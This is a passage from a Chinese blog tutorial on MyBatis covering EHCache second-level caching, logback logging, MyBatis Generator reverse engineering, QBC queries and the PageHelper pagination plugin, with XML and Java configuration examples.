class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ehcache</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:noNamespaceSchemaLocation</span>=<span class="string">&quot;../config/ehcache.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 磁盘保存路径 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">diskStore</span> <span class="attr">path</span>=<span class="string">&quot;D:\atguigu\ehcache&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">defaultCache</span></span></span><br><span class="line"><span class="tag">        <span class="attr">maxElementsInMemory</span>=<span class="string">&quot;1000&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">maxElementsOnDisk</span>=<span class="string">&quot;10000000&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">eternal</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">overflowToDisk</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">timeToIdleSeconds</span>=<span class="string">&quot;120&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">timeToLiveSeconds</span>=<span class="string">&quot;120&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">diskExpiryThreadIntervalSeconds</span>=<span class="string">&quot;120&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">memoryStoreEvictionPolicy</span>=<span class="string">&quot;LRU&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">defaultCache</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ehcache</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="10-5-4、设置二级缓存的类型"><a href="#10-5-4、设置二级缓存的类型" class="headerlink" title="10.5.4、设置二级缓存的类型"></a>10.5.4、设置二级缓存的类型</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">cache</span> <span class="attr">type</span>=<span class="string">&quot;org.mybatis.caches.ehcache.EhcacheCache&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h3 id="10-5-5、加入logback日志"><a href="#10-5-5、加入logback日志" class="headerlink" title="10.5.5、加入logback日志"></a>10.5.5、加入logback日志</h3><blockquote><p>存在SLF4J时，作为简易日志的log4j将失效，此时我们需要借助SLF4J的具体实现logback来打印日志。 创建logback的配置文件logback.xml</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">debug</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 指定日志输出的位置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;STDOUT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 日志输出的格式 --&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 按照顺序分别是： 时间、日志级别、线程名称、打印日志的类、日志主体内容、换行--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pattern</span>&gt;</span>[%d&#123;HH:mm:ss.SSS&#125;] [%-5level] [%thread] [%logger][%msg]%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 设置全局日志级别。日志级别按顺序分别是： DEBUG、INFO、WARN、ERROR --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 指定任何一个日志级别都只打印当前级别和后面级别的日志。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 指定打印日志的appender，这里通过“STDOUT”引用了前面配置的appender --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;STDOUT&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 根据特殊需求指定局部日志级别 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;com.atguigu.crowd.mapper&quot;</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="10-5-6、EHCache配置文件说明"><a href="#10-5-6、EHCache配置文件说明" class="headerlink" title="10.5.6、EHCache配置文件说明"></a>10.5.6、EHCache配置文件说明</h3><table><thead><tr><th><strong>属性名</strong></th><th><strong>是否必须</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>maxElementsInMemory</td><td>是</td><td>在内存中缓存的element的最大数目</td></tr><tr><td>maxElementsOnDisk</td><td>是</td><td>在磁盘上缓存的element的最大数目，若是0表示无穷大</td></tr><tr><td>eternal</td><td>是</td><td>设定缓存的elements是否永远不过期。 如果为true，则缓存的数据始终有效， 如果为false那么还要根据timeToIdleSeconds、timeToLiveSeconds判断</td></tr><tr><td>overflowToDisk</td><td>是</td><td>设定当内存缓存溢出的时候是否将过期的element缓存到磁盘上</td></tr><tr><td>timeToIdleSeconds</td><td>否</td><td>当缓存在EhCache中的数据前后两次访问的时间超过timeToIdleSeconds的属性取值时， 这些数据便会删除，默认值是0,也就是可闲置时间无穷大</td></tr><tr><td>timeToLiveSeconds</td><td>否</td><td>缓存element的有效生命期，默认是0.,也就是element存活时间无穷大</td></tr><tr><td>diskSpoolBufferSizeMB</td><td>否</td><td>DiskStore(磁盘缓存)的缓存区大小。默认是30MB。每个Cache都应该有自己的一个缓冲区</td></tr><tr><td>diskPersistent</td><td>否</td><td>在VM重启的时候是否启用磁盘保存EhCache中的数据，默认是false。</td></tr><tr><td>diskExpiryThreadIntervalSeconds</td><td>否</td><td>磁盘缓存的清理线程运行间隔，默认是120秒。每个120s， 相应的线程会进行一次EhCache中数据的清理工作</td></tr><tr><td>memoryStoreEvictionPolicy</td><td>否</td><td>当内存缓存达到最大，有新的element加入的时候， 移除缓存中element的策略。 默认是LRU （最近最少使用），可选的有LFU （最不常使用）和FIFO （先进先出）</td></tr></tbody></table><h1 id="11、MyBatis的逆向工程"><a href="#11、MyBatis的逆向工程" class="headerlink" title="11、MyBatis的逆向工程"></a>11、MyBatis的逆向工程</h1><blockquote><p>正向工程：先创建Java实体类，由框架负责根据实体类生成数据库表。 Hibernate是支持正向工</p><p>程的。</p><p>逆向工程：先创建数据库表，由框架负责根据数据库表，反向生成如下资源：</p><ul><li>Java实体类</li><li>Mapper接口</li><li>Mapper映射文件</li></ul></blockquote><h2 id="11-1、创建逆向工程的步骤"><a href="#11-1、创建逆向工程的步骤" class="headerlink" title="11.1、创建逆向工程的步骤"></a>11.1、创建逆向工程的步骤</h2><h3 id="①添加依赖和插件"><a href="#①添加依赖和插件" class="headerlink" title="①添加依赖和插件"></a>①添加依赖和插件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 依赖MyBatis核心包 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- junit测试 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- log4j日志 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 控制Maven在构建过程中相关配置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 构建过程中用到的插件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 具体插件，逆向工程的操作是以构建过程中插件形式出现的 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.generator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-generator-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 插件的依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 逆向工程的核心依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.generator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-generator-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- MySQL驱动 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="②创建MyBatis的核心配置文件"><a href="#②创建MyBatis的核心配置文件" class="headerlink" title="②创建MyBatis的核心配置文件"></a>②创建MyBatis的核心配置文件</h3><h3 id="③创建逆向工程的配置文件"><a href="#③创建逆向工程的配置文件" class="headerlink" title="③创建逆向工程的配置文件"></a>③创建逆向工程的配置文件</h3><blockquote><p>文件名必须是：generatorConfig.xml</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">generatorConfiguration</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">generatorConfiguration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">targetRuntime: 执行生成的逆向工程的版本</span></span><br><span class="line"><span class="comment">                MyBatis3Simple: 生成基本的CRUD（清新简洁版）</span></span><br><span class="line"><span class="comment">                MyBatis3: 生成带条件的CRUD（奢华尊享版）</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context</span> <span class="attr">id</span>=<span class="string">&quot;DB2Tables&quot;</span> <span class="attr">targetRuntime</span>=<span class="string">&quot;MyBatis3&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 数据库的连接信息 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jdbcConnection</span> <span class="attr">driverClass</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">connectionURL</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/mybatis?serverTimezone=UTC&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">userId</span>=<span class="string">&quot;root&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">password</span>=<span class="string">&quot;123456&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jdbcConnection</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- javaBean的生成策略--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">javaModelGenerator</span> <span class="attr">targetPackage</span>=<span class="string">&quot;com.atguigu.mybatis.pojo&quot;</span><span class="attr">targetProject</span>=<span class="string">&quot;.\src\main\java&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;trimStrings&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">javaModelGenerator</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- SQL映射文件的生成策略 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sqlMapGenerator</span> <span class="attr">targetPackage</span>=<span class="string">&quot;com.atguigu.mybatis.mapper&quot;</span><span class="attr">targetProject</span>=<span class="string">&quot;.\src\main\resources&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sqlMapGenerator</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Mapper接口的生成策略 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">javaClientGenerator</span> <span class="attr">type</span>=<span class="string">&quot;XMLMAPPER&quot;</span><span class="attr">targetPackage</span>=<span class="string">&quot;com.atguigu.mybatis.mapper&quot;</span> <span class="attr">targetProject</span>=<span class="string">&quot;.\src\main\java&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">javaClientGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 逆向分析的表 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- tableName设置为*号，可以对应所有表，此时不写domainObjectName --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- domainObjectName属性指定生成出来的实体类的类名 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">tableName</span>=<span class="string">&quot;t_emp&quot;</span> <span class="attr">domainObjectName</span>=<span class="string">&quot;Emp&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">tableName</span>=<span class="string">&quot;t_dept&quot;</span> <span class="attr">domainObjectName</span>=<span class="string">&quot;Dept&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">generatorConfiguration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="④执行MBG插件的generate目标"><a href="#④执行MBG插件的generate目标" class="headerlink" title="④执行MBG插件的generate目标"></a>④执行MBG插件的generate目标</h3><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/3.png"></p><h3 id="⑤效果"><a href="#⑤效果" class="headerlink" title="⑤效果"></a>⑤效果</h3><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/4.png"></p><h2 id="11-2、QBC查询"><a href="#11-2、QBC查询" class="headerlink" title="11.2、QBC查询"></a>11.2、QBC查询</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testMBG</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> Resources.getResourceAsStream(<span class="string">&quot;mybatis-config.xml&quot;</span>);</span><br><span class="line"><span class="type">SqlSessionFactory</span> <span class="variable">sqlSessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line"><span class="title class_">SqlSessionFactoryBuilder</span>().build(is);</span><br><span class="line"><span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> sqlSessionFactory.openSession(<span class="literal">true</span>);</span><br><span class="line"><span class="type">EmpMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(EmpMapper.class);</span><br><span class="line">        <span class="comment">//查询所有数据</span></span><br><span class="line">        <span class="comment">/*List&lt;Emp&gt; list = mapper.selectByExample(null);</span></span><br><span class="line"><span class="comment">        list.forEach(emp -&gt; System.out.println(emp));*/</span></span><br><span class="line">        <span class="comment">//根据条件查询</span></span><br><span class="line">        <span class="comment">/*EmpExample example = new EmpExample();</span></span><br><span class="line"><span class="comment">        example.createCriteria().andEmpNameEqualTo(&quot;张三&quot;).andAgeGreaterThanOrEqualTo(20);</span></span><br><span class="line"><span class="comment">        example.or().andDidIsNotNull();</span></span><br><span class="line"><span class="comment">List&lt;Emp&gt; list = mapper.selectByExample(example);</span></span><br><span class="line"><span class="comment">        list.forEach(emp -&gt; System.out.println(emp));*/</span></span><br><span class="line">        mapper.updateByPrimaryKeySelective(newEmp(<span class="number">1</span>,<span class="string">&quot;admin&quot;</span>,<span class="number">22</span>,<span class="literal">null</span>,<span class="string">&quot;456@qq.com&quot;</span>,<span class="number">3</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="12、分页插件"><a href="#12、分页插件" class="headerlink" title="12、分页插件"></a>12、分页插件</h1><p>limit index,pageSize</p><p>pageSize：每页显示的条数</p><p>pageNum：当前页的页码</p><p>index：当前页的起始索引，index&#x3D;(pageNum-1)*pageSize</p><p>count：总记录数</p><p>totalPage：总页数</p><p>totalPage &#x3D; count &#x2F; pageSize;</p><p>if(count % pageSize !&#x3D; 0){</p><p>totalPage +&#x3D; 1;</p><p>}</p><p>pageSize&#x3D;4，pageNum&#x3D;1，index&#x3D;0 limit 0,4</p><p>pageSize&#x3D;4，pageNum&#x3D;3，index&#x3D;8 limit 8,4</p><p>pageSize&#x3D;4，pageNum&#x3D;6，index&#x3D;20 limit 8,4</p><p>首页 上一页 2 3 4 5 6 下一页 末页</p><h2 id="12-1、分页插件的使用步骤"><a href="#12-1、分页插件的使用步骤" class="headerlink" title="12.1、分页插件的使用步骤"></a>12.1、分页插件的使用步骤</h2><h3 id="①添加依赖"><a href="#①添加依赖" class="headerlink" title="①添加依赖"></a>①添加依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.pagehelper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>pagehelper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="②配置分页插件"><a href="#②配置分页插件" class="headerlink" title="②配置分页插件"></a>②配置分页插件</h3><p>在MyBatis的核心配置文件中配置插件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--设置分页插件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span> <span class="attr">interceptor</span>=<span class="string">&quot;com.github.pagehelper.PageInterceptor&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="12-2、分页插件的使用"><a href="#12-2、分页插件的使用" class="headerlink" title="12.2、分页插件的使用"></a>12.2、分页插件的使用</h2><p>a&gt;在查询功能之前使用PageHelper.startPage(int pageNum, int pageSize)开启分页功能</p><blockquote><p>pageNum：当前页的页码</p><p>pageSize：每页显示的条数</p></blockquote><p>b&gt;在查询获取list集合之后，使用PageInfo<T> pageInfo &#x3D; new PageInfo&lt;&gt;(List<T> list, int</p><p>navigatePages)获取分页相关数据</p><blockquote><p>list：分页之后的数据</p><p>navigatePages：导航分页的页码数</p></blockquote><p>c&gt;分页相关数据</p><blockquote><p>PageInfo{</p><p>pageNum&#x3D;8, pageSize&#x3D;4, size&#x3D;2, startRow&#x3D;29, endRow&#x3D;30, total&#x3D;30, pages&#x3D;8,</p><p>list&#x3D;Page{count&#x3D;true, pageNum&#x3D;8, pageSize&#x3D;4, startRow&#x3D;28, endRow&#x3D;32, total&#x3D;30,</p><p>pages&#x3D;8, reasonable&#x3D;false, pageSizeZero&#x3D;false},</p><p>prePage&#x3D;7, nextPage&#x3D;0, isFirstPage&#x3D;false, isLastPage&#x3D;true, hasPreviousPage&#x3D;true,</p><p>hasNextPage&#x3D;false, navigatePages&#x3D;5, navigateFirstPage4, navigateLastPage8,</p><p>navigatepageNums&#x3D;[4, 5, 6, 7, 8]</p><p>}</p><p>pageNum：当前页的页码</p><p>pageSize：每页显示的条数</p><p>size：当前页显示的真实条数</p><p>total：总记录数</p><p>pages：总页数</p><p>prePage：上一页的页码</p><p>nextPage：下一页的页码</p><p>isFirstPage&#x2F;isLastPage：是否为第一页&#x2F;最后一页</p><p>hasPreviousPage&#x2F;hasNextPage：是否存在上一页&#x2F;下一页</p><p>navigatePages：导航分页的页码数</p><p>navigatepageNums：导航分页的页码，[1,2,3,4,5]</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
